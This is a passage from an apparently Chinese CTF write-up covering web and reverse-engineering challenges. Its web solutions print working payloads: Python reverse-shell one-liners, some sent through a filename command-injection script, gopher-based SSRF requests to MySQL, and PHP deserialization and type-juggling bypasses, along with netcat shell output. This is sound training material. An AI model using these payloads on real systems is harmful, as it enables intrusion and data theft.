crypt(data[salt_length:], sha1(key + salt).digest())</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> tdecode(strCipher, key)</span><br><span class="line"><span class="comment"># C1ctf&#123;5f601e8cc1bde1f1a54e336158ba766d&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x01-resize-your-image"><a href="#0x01-resize-your-image" class="headerlink" title="0x01 resize your image"></a>0x01 resize your image</h3><p>vulhub <a href="https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2018-16509" target="_blank" rel="noopener">原题</a>, payload 改一下  </p>
<p><code>python -c &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;Your IP&#39;,Your Port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/sh&#39;,&#39;-i&#39;]);&quot;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvvp <span class="number">19132</span></span><br><span class="line">Listening on [<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>] (family <span class="number">0</span>, port <span class="number">19132</span>)</span><br><span class="line">Connection <span class="keyword">from</span> <span class="number">212.64</span><span class="number">.85</span><span class="number">.131</span> <span class="number">40172</span> received!</span><br><span class="line">/bin/sh: <span class="number">0</span>: can<span class="string">'t access tty; job control turned off</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">app.py</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string"># cat flag</span></span><br><span class="line"><span class="string">C1CTF&#123;hello_world&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-web签到"><a href="#0x02-web签到" class="headerlink" title="0x02 web签到"></a>0x02 web签到</h3><p>改一下 cookie 就行, 我用的是 <a href="https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg" target="_blank" rel="noopener">EditThisCookie</a></p>
<p><img src="https://i.loli.net/2019/03/08/5c826dfb50be6.png" alt="">  </p>
<p><img src="https://i.loli.net/2019/03/08/5c826e11a3277.png" alt="">  </p>
<h3 id="0x03-php是世界上最好的语言"><a href="#0x03-php是世界上最好的语言" class="headerlink" title="0x03 php是世界上最好的语言"></a>0x03 php是世界上最好的语言</h3><p>在 <a href="http://212.64.85.131/robots.txt" target="_blank" rel="noopener">http://212.64.85.131/robots.txt</a> 可以找到提示, <code>Disallow: /flag.zip</code>, 下下来就可以得到源码, 接下来就是源码审计</p>
<ol>
<li><code>($a == $b) + (md5($a) != sha1($b))</code> 这个很好绕, 传两个值不一样的数组就可以绕过, 比如 <code>a[1]=1&amp;b[1]=2</code>. 原理是 md5 和 sha1 对 数组会返回 NULL</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(md5(<span class="keyword">array</span>()));</span><br><span class="line">PHP Warning:  md5() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Warning: md5() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line"><span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>

<p>2.<code>$token[&#39;user&#39;] == &quot;????????&quot; &amp;&amp; $token[&#39;pass&#39;] == &quot;????????&quot;</code> 我竟然以为真的要想办法绕过… 后来试了下居然真的只要让 <code>user=????????</code> 就行了233</p>
<p>3.<code>$flag-&gt;middle === $flag-&gt;left &amp;&amp; $flag-&gt;middle === $flag-&gt;right</code> 这个绕过第一感觉是不可能, 除非能有像 C++ 那样的引用, 然后百度了一下… 居然真的有这种骚东西 还真的可以序列化 233</p>
<p>如果反序列化这方面有问题的话可以百度一下对应的教程</p>
<p>整合一下得到 payload <code>curl &quot;http://212.64.85.131/?mode=begin&amp;a[1]=1&amp;b[1]=2&quot; -d &#39;token=a:2:{s:4:&quot;user&quot;;s:8:&quot;????????&quot;;s:4:&quot;pass&quot;;s:8:&quot;????????&quot;;}&amp;flag=O:9:&quot;last_task&quot;:3:{s:4:&quot;left&quot;;N;s:6:&quot;middle&quot;;R:2;s:5:&quot;right&quot;;R:2;}&#39;</code></p>
<p>得到 this is your flag C1ctf{Php_1s_best_language_in_the_world}  </p>
<h3 id="0x04-今年还有小姐姐"><a href="#0x04-今年还有小姐姐" class="headerlink" title="0x04 今年还有小姐姐"></a>0x04 今年还有小姐姐</h3><p>fuzz 一下 file:// 被过滤了, 然后看了下 HINT. 发现在 info.php 左下角非常猥琐的藏着 sql 语句…</p>
<p><img src="https://i.loli.net/2019/03/08/5c826e702af72.png" alt=""></p>
<p>基本上可以确定是 gopher + ssrf 了</p>
<p>让他访问 <a href="http://127.0.0.1:3306" target="_blank" rel="noopener">http://127.0.0.1:3306</a> 也确实可以得到 mysql 的 banner</p>
<p><img src="https://i.loli.net/2019/03/08/5c826e89d5c9b.png" alt=""></p>
<p>具体原理可以看<a href="https://www.freebuf.com/articles/web/159342.html" target="_blank" rel="noopener">这里</a>, 简单来说 gopher 协议可以将任意内容通过 tcp 发送, 而 mysql 在空密码时握手包的内容是固定的, 我们就可以通过 gopher 来读取数据库中的内容</p>
<p>这里可以通过在本地搭一个空密码的 root 账号的 mysql 加上 wireshark 来重放一遍客户端发送的数据, 得到服务器上数据库的应答</p>
<p>这里可以用 -e 选项来直接执行命令. 通过提示里的表结构可以构造如下语句</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -e <span class="string">"SELECT path FROM ctf.flag"</span> -h127.0.0.1</span><br></pre></td></tr></table></figure>

<p>然后在 wireshark 里面导出以后用 urlencode 一下加在 gopher://127.0.0.1:3306/A 后面(注意A留着, 不能删), 这里我的 payload 是 </p>
<p><code>gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520083%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql%1A%00%00%00%03SELECT%20path%20FROM%20ctf.flag%01%00%00%00%01</code></p>
<p><img src="https://i.loli.net/2019/03/08/5c826ec9b4061.png" alt=""></p>
<p><code>/var/lib/mysql-files/flag.txt</code> 即是路径, 再通过 load_file 来读取它</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -e <span class="string">"SELECT load_file('/var/lib/mysql-files/flag.txt')"</span> -h127.0.0.1</span><br></pre></td></tr></table></figure>

<p>得到 payload </p>
<p><code>gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520924%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql2%00%00%00%03SELECT%20load_file%28%27/var/lib/mysql-files/flag.txt%27%29%01%00%00%00%01</code></p>
<p>然后你会得到… </p>
<p><img src="https://i.loli.net/2019/03/08/5c826ef30a8bd.png" alt=""></p>
<p>太真实了, 再 fuzz 一下, 发现过滤了 file 和 - 字符, 直接 urlencode 一下就可以 bypass, 得到新的 payload </p>
<p><code>gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520924%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql2%00%00%00%03SELECT%20load_%66ile%28%27/var/lib/mysql%2dfiles/flag.txt%27%29%01%00%00%00%01</code></p>
<p><img src="https://i.loli.net/2019/03/08/5c826f0a88582.png" alt=""></p>
<p>得到 flag{gopher_make_mysql_happy}</p>
<h3 id="0x05-eeeee"><a href="#0x05-eeeee" class="headerlink" title="0x05 eeeee"></a>0x05 eeeee</h3><p>考察点: Django目录穿越,命令执行bypass</p>
<p>入口点: <a href="http://212.64.89.186/booksystem/static/" target="_blank" rel="noopener">http://212.64.89.186/booksystem/static/</a><br>访问之后是500,在后面输入内容显示文件不存在, 所以这里可以判断出是存在文件读取的：<br><a href="http://212.64.89.186/booksystem/static/..%2f..%2fpass.txt" target="_blank" rel="noopener">http://212.64.89.186/booksystem/static/..%2f..%2fpass.txt</a><br>后台逻辑为:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(request,filename)</span>:</span></span><br><span class="line">    full_path = os.path.join(<span class="string">'static'</span>, filename)</span><br><span class="line">    <span class="comment">#print(full_path)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(full_path):</span><br><span class="line">        <span class="keyword">return</span> HttpResponseNotFound(<span class="string">'&lt;h1&gt;file not found&lt;h1&gt;'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(filename[<span class="number">-3</span>:]==<span class="string">"css"</span>):</span><br><span class="line">            response = HttpResponse(read_file(full_path))</span><br><span class="line">            response[<span class="string">'Content-Type'</span>] = <span class="string">'text/css'</span></span><br><span class="line">            response[<span class="string">'Content-Length'</span>] = os.path.getsize(full_path)</span><br><span class="line">            <span class="comment">#response['Content-Disposition'] = 'attachment; filename=%s' % filename</span></span><br><span class="line">            response[<span class="string">'Accept-Ranges'</span>] = <span class="string">'bytes'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">elif</span>(filename[<span class="number">-3</span>:]==<span class="string">"svg"</span>):</span><br><span class="line">            response = HttpResponse(read_file(full_path))</span><br><span class="line">            response[<span class="string">'Content-Type'</span>] = <span class="string">'image/svg+xml'</span></span><br><span class="line">            response[<span class="string">'Content-Length'</span>] = os.path.getsize(full_path)</span><br><span class="line">            <span class="comment">#response['Content-Disposition'] = 'attachment; filename=%s' % filename</span></span><br><span class="line">            response[<span class="string">'Accept-Ranges'</span>] = <span class="string">'bytes'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = HttpResponse(read_file(full_path))</span><br><span class="line">            response[<span class="string">'Content-Type'</span>] = <span class="string">'text/html'</span></span><br><span class="line">            response[<span class="string">'Content-Length'</span>] = os.path.getsize(full_path)</span><br><span class="line">            <span class="comment">#response['Content-Disposition'] = 'attachment; filename=%s' % filename</span></span><br><span class="line">            response[<span class="string">'Accept-Ranges'</span>] = <span class="string">'bytes'</span></span><br><span class="line">            <span class="keyword">return</span> response   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">            <span class="keyword">yield</span> content</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.message)</span><br><span class="line">        print(<span class="string">'read error'</span>)</span><br></pre></td></tr></table></figure>

<p>可以读取到admin的用户名和密码,然后进行登录: admin:this_is_admin_password</p>
<p>使用admin登录之后可以看到上传文件的地方,因为是python写的, 所以不太确定能不能上传webshell, 然后使用之前的任意文件读取读源码, 看实现逻辑:<br><a href="http://212.64.89.186/booksystem/static/..%2fbooksystem/views.py" target="_blank" rel="noopener">http://212.64.89.186/booksystem/static/..%2fbooksystem/views.py</a><br>实现逻辑:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Do_upload</span><span class="params">(request)</span>:</span> <span class="comment">#文件上传, 格式转换</span></span><br><span class="line">    black_list = [<span class="string">'`'</span>,<span class="string">';'</span>,<span class="string">'&amp;'</span>,<span class="string">'|'</span>,<span class="string">"PS"</span>,<span class="string">'&gt;'</span>,<span class="string">"&lt;"</span>]</span><br><span class="line">    <span class="comment">#return HttpResponse(os.path)</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        ret = &#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'data'</span>: <span class="literal">None</span>, <span class="string">'error'</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        user = request.POST.get(<span class="string">'user'</span>)</span><br><span class="line">        img = request.FILES.get(<span class="string">'img'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> img.name:</span><br><span class="line">                <span class="keyword">return</span> HttpResponse(<span class="string">"你是魔鬼吗？"</span>)</span><br><span class="line">        f = open(os.path.join(<span class="string">'upfile'</span>, img.name), <span class="string">'wb'</span>)</span><br><span class="line">        <span class="comment">#return HttpResponse(os.path)</span></span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> img.chunks(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b"%!PS"</span> <span class="keyword">in</span> chunk:</span><br><span class="line">                 <span class="keyword">return</span> HttpResponse(<span class="string">"你是个大魔鬼！"</span>)</span><br><span class="line">            f.write(chunk)</span><br><span class="line">        f.close()</span><br><span class="line">        ret[<span class="string">'status'</span>] = <span class="literal">True</span></span><br><span class="line">        ret[<span class="string">'data'</span>] = os.path.join(<span class="string">'upfile'</span>, <span class="string">'smaller_'</span>+img.name)</span><br><span class="line">        command = <span class="string">"convert -resize 200x100 \`pwd\`/upfile/"</span>+img.name+<span class="string">"  \`pwd\`/upfile/smaller_"</span>+img.name+<span class="string">";rm \`pwd\`/upfile/"</span>+img.name</span><br><span class="line">        <span class="comment">#os.system("echo "+command+"&gt; /tmp/123")</span></span><br><span class="line">        os.system(command)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(json.dumps(ret))</span><br><span class="line">        <span class="comment"># except Exception as e:</span></span><br><span class="line">        <span class="comment">#     ret['error'] = e</span></span><br><span class="line">        <span class="comment"># finally:</span></span><br><span class="line">        <span class="comment">#     f.close()</span></span><br><span class="line">        <span class="comment">#     return HttpResponse(json.dumps(ret))</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<p>本意是利用imagemagic的洞getshell的, 但是我太懒了, 没有换服务器里面的版本, 所以就只能用文件名导致的命令注入了, 这里有个坑, nginx会把 “/“ 后面的作为文件名解析, 所以需要绕过 “/“, exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">"img"</span>: (<span class="string">"asd\npython -c \"import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('Your_ip',19132))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([chr(47)+'bin'+chr(47)+'sh','-i'])\""</span>, <span class="string">"asd"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">"http://212.64.89.186/upload/"</span>, files=files)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvvp 19132</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 19132)</span><br><span class="line">Connection from 212.64.89.186 38538 received!</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ ls</span><br><span class="line">FlightTicket</span><br><span class="line">a.txt</span><br><span class="line">aaab.txt</span><br><span class="line">article.db</span><br><span class="line">booksystem</span><br><span class="line">flightdb.sqlite3</span><br><span class="line">index.html</span><br><span class="line">index.html.1</span><br><span class="line">index.html.2</span><br><span class="line">manage.py</span><br><span class="line">nohup.out</span><br><span class="line">pass.txt</span><br><span class="line">requirements.txt</span><br><span class="line">static</span><br><span class="line">templates</span><br><span class="line">testdb.py</span><br><span class="line">upfile</span><br><span class="line">$ cat ~&#x2F;Flaaa44444AAAAAAGGGGGG</span><br><span class="line">flag&#123;Django_is_Very_Interesting&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x06-baby-exec"><a href="#0x06-baby-exec" class="headerlink" title="0x06 baby exec"></a>0x06 baby exec</h3><p>代码如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">error_reporting(E_ALL ^ E_WARNING);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$v1 = [<span class="string">'admin'</span>,<span class="string">'test'</span>];</span><br><span class="line">$v2 = $_POST[<span class="string">'v2'</span>];</span><br><span class="line">$number = <span class="number">1</span>;</span><br><span class="line">$v5=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($v2 === $v1 &amp; $v2[<span class="number">0</span>] != <span class="string">'admin'</span>)&#123;<span class="comment">//There you can execute the command</span></span><br><span class="line">    </span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    $v4 = $_GET;</span><br><span class="line">    <span class="keyword">foreach</span>($v4 <span class="keyword">as</span> $key =&gt; $cmd)&#123;</span><br><span class="line">        <span class="keyword">if</span>($key == $system_function)&#123;</span><br><span class="line">            $v5 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>($v5 &amp;&amp; strlen($v3)&gt;<span class="number">11</span> &amp;&amp; $number == <span class="number">3</span>)&#123;</span><br><span class="line">            $system_function($cmd,$key); </span><br><span class="line">        &#125;</span><br><span class="line">        $number++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry"</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="string">'hhhhhhhhhhhhhhhh_exec.php'</span>);</span><br></pre></td></tr></table></figure>

<p>一步一步看代码, 一眼看是不可能进行利用的, 在 <code>if($v2 === $v1 &amp; $v2[0] != &#39;admin&#39;)</code> 常理是不可能绕过的, 但是看一下php版本, 也是前两天看youtube看到了这一个技巧, 在php5.5.9中会产生int溢出, 2^32 = 4294967296 会解析成0, 这样就可以绕过这一步.<br>POST输入v4, GET输入v3, 并且v3要比11个字符要长. </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($key == $system_function)&#123;</span><br><span class="line">    $v5 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双等于号用弱类型就可以绕过.<br>比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"asdsadsad"</span>;</span><br><span class="line">$b = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> $a==$b;</span><br></pre></td></tr></table></figure>

<p>这时就会输出1.<br>v5,$v3就已经满足了, 只需要将命令作为第三组就可以执行命令, 最后payload：<br><code>curl &quot;http://212.64.89.186:9992/hhhhhhhhhhhhhhhh_exec.php/hhhhhhhhhhhhhhhh_exec.php?v3=aaaaaaaaaaaaaaaaaaaaa&amp;0=asd&amp;system=cat%20index.php&quot; -d &quot;v2[4294967296]=admin&amp;v2[1]=test&quot;</code></p>
<p>得到 flag{PhP_1S_Best_Lang}</p>
<h2 id="Reserve"><a href="#Reserve" class="headerlink" title="Reserve"></a>Reserve</h2><h3 id="0x01-iOS13"><a href="#0x01-iOS13" class="headerlink" title="0x01 iOS13"></a>0x01 iOS13</h3><p>改一下版本号安装到 iPhone 上, 不过, 我没有 iOS 设备啊, 那就….</p>
<p>把整个 ipa 拖入 ida 内,最后发现 <code>iOS13</code> 内有 <code>C1CTF&amp;#123;%s&amp;#125;</code>, 而 iOS13dyn 内有剩下的 flag</p>
<p>可以看到 0 是参数, 所以 %d 应该用 0 替代. </p>
<h3 id="0x02-Captcha"><a href="#0x02-Captcha" class="headerlink" title="0x02 Captcha"></a>0x02 Captcha</h3><p>如果当成 Misc 来做的话可以直接用CE修改, 改成只需要输入 1 个验证码就可以结束</p>
<h3 id="0x03-Adjacent"><a href="#0x03-Adjacent" class="headerlink" title="0x03 Adjacent"></a>0x03 Adjacent</h3><p>注意反编译后的这一条语句:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((<span class="keyword">unsigned</span> __int8)s[i + <span class="number">1</span>] ^ (<span class="keyword">unsigned</span> __int8)s[i]) != *(&amp;v5 + i))</span><br></pre></td></tr></table></figure>

<p>实际上就是把字符串中相邻两个字节进行异或, 前面的结果进行比较, 我们知道flag开头是 <code>C1CTF{xxxx}</code></p>
<p>就算不知道是 C 开头, 也知道是 <code>}</code> 结尾</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag2[<span class="number">31</span>] = &#123; <span class="number">0x72</span>,<span class="number">0x72</span>,<span class="number">0x17</span>,<span class="number">0x12</span>,<span class="number">0x3d</span>,<span class="number">0x23</span>,<span class="number">0x68</span>,<span class="number">0x42</span>,<span class="number">0x2d</span>,<span class="number">0x1e</span>,<span class="number">0x25</span>,<span class="number">0x0e</span>,<span class="number">0x0b</span>,<span class="number">0x22</span>,<span class="number">0x70</span>,<span class="number">0x5d</span>,<span class="number">0x1a</span>,<span class="number">0x2b</span>,<span class="number">0x3c</span>,<span class="number">0x2b</span>,<span class="number">0x29</span>,<span class="number">0x13</span>,<span class="number">0x2d</span>,<span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x62</span>,<span class="number">0x2d</span>,<span class="number">0x2a</span>,<span class="number">0x29</span>,<span class="number">0x13</span>,<span class="number">0x14</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">33</span>] = &#123; <span class="string">'C'</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    flag[i] = flag2[i<span class="number">-1</span>] ^ flag[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//"C1CTF&#123;X0r_AdjaC3nt_cHar_96TySzi&#125;"</span></span><br></pre></td></tr></table></figure>

<h3 id="0x04-encoding"><a href="#0x04-encoding" class="headerlink" title="0x04 encoding"></a>0x04 encoding</h3><p>这道题可以爆破, 爆破的方法就不在此说了. </p>
<p>第一部分是异或</p>
<p>第二步可以从 <code>sub_7FA</code> 得到这样的置换表：</p>
<p><code>nopqrstuvwxyzabcdefghijklm0123456789ABCDEFGHIJKL+/MNOPQRSTUVWXYZ</code></p>
<p>然后</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_BYTE \*__<span class="function">fastcall <span class="title">sub_A84</span><span class="params">(__int64 a1, _BYTE \*a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+19h] [rbp-7h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [rsp+1Ah] [rbp-6h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 i; <span class="comment">// [rsp+1Bh] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(v7 + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    \*v3++ = sub_7FA((<span class="keyword">unsigned</span> __int8)((<span class="keyword">int</span>)\*(<span class="keyword">unsigned</span> __int8 *)(v7 + a1) &gt;&gt; (v5 + <span class="number">2</span>)) | v4); <span class="comment">//舍弃 v7中的v5+2位</span></span><br><span class="line">    v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">7</span>;   <span class="comment">// mod 8 剩余位数</span></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">      v4 |= ((<span class="number">1</span> &lt;&lt; i) &amp; *(<span class="keyword">unsigned</span> __int8 *)(v7 + a1)) &lt;&lt; (<span class="number">6</span> - v5);   <span 